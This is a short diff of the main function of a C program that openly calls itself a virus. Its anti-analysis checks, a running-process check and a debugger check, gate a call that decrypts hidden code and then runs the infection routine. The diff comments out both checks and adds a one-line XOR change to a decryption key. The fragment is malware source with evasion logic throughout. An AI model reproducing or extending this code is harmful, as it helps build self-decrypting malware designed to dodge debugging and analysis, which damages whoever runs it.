@@ -92,13 +92,17 @@ int main(int ac, char **av){
 	cmp[2] = 's';
 	cmp[3] = 't';
 	cmp[4] = '\0';
-	if (checkproc(cmp) == FALSE)
+	/*if (checkproc(cmp) == FALSE)
+	{
+		CALL(SYS_write, 1, cmp, 4);
 		return FALSE;
-	if (checkdebug() == 0)
+	}*/
+	key[0] ^= 0b01110010 ;//<< traceme();
+	/*if (checkdebug() == 0)
 	{
 		return decryptHiddenCode() && virus(ac, av);
 	}
 	else
-		CALL(SYS_write, 1, "DEBUGGING..\n", 12);
+		CALL(SYS_write, 1, "DEBUGGING..\n", 12);*/
 	return (0);
 }
